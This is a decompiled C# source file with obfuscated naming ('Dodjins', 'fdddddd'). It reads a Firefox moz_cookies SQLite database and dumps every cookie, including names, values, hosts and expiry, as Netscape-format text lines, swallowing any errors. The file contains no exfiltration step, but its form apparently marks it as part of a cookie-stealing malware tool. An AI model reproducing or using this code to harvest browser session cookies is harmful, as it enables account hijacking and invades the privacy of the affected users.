using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SQLite;
using System.IO;

namespace Dodjins
{
	// Token: 0x0200002C RID: 44
	public class fdddddd
	{
		// Token: 0x060000E7 RID: 231 RVA: 0x00006934 File Offset: 0x00004B34
		public fdddddd(string _cookiePath)
		{
			this.CookiePath = _cookiePath;
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x00006950 File Offset: 0x00004B50
		public string[] Cookies()
		{
			string[] result;
			try
			{
				bool flag = !File.Exists(this.CookiePath);
				if (flag)
				{
					result = new string[0];
				}
				else
				{
					List<string> list = new List<string>();
					string text = "Data Source = " + this.CookiePath;
					string text2 = "SELECT* FROM moz_cookies";
					DataTable dataTable = new DataTable();
					string text3 = text2;
					using (SQLiteConnection sqliteConnection = new SQLiteConnection(text))
					{
						SQLiteCommand sqliteCommand = new SQLiteCommand(text3, sqliteConnection);
						SQLiteDataAdapter sqliteDataAdapter = new SQLiteDataAdapter(sqliteCommand);
						sqliteDataAdapter.Fill(dataTable);
					}
					for (int i = 0; i < dataTable.Rows.Count; i++)
					{
						List<string> values = new List<string>
						{
							dataTable.Rows[i][1].ToString(),
							(dataTable.Rows[i][11].ToString() == "0") ? "FALSE" : "TRUE",
							dataTable.Rows[i][6].ToString(),
							(dataTable.Rows[i][10].ToString() == "0") ? "FALSE" : "TRUE",
							dataTable.Rows[i][7].ToString(),
							dataTable.Rows[i][3].ToString(),
							dataTable.Rows[i][4].ToString()
						};
						list.Add(string.Join("\t", values));
					}
					result = list.ToArray();
				}
			}
			catch (Exception ex)
			{
				result = new string[0];
			}
			return result;
		}

		// Token: 0x04000080 RID: 128
		private string CookiePath = string.Empty;
	}
}
